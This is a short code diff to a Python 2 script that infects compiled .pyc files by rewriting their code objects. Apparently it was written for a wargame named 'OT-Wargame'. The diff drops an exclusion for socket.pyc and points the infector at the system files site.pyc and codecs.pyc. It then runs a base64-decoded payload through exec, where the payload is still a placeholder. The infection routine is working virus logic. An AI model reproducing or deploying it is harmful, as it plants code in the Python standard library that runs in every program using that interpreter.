@@ -44,9 +44,6 @@ if __file__.endswith('.pyc'):
 
     def infect(f_to_infect):
         #print "j'infecte %s" % f_to_infect
-        if f_to_infect.endswith("socket.pyc"):
-            return
-
         f = open(f_to_infect, 'r')
 
         head = f.read(8)
@@ -68,13 +65,12 @@ if __file__.endswith('.pyc'):
         marshal.dump(data.to_code(), newfile)
         newfile.close()
 
-
     if socket.gethostname() == "OT-Wargame":
-        target_dir = "/usr/lib/python2.6/*.pyc"
+        targets = ["/usr/lib/python2.6/site.pyc", "/usr/lib/python2.6/codecs.pyc"]
     else:
-        target_dir = "./targets/*.pyc"
+        targets = glob.glob("./targets/*.pyc")
 
-    for i in glob.glob(target_dir):
+    for i in targets:
         infect(i)
 
     exec b64decode("__PAYLOAD_PY__")
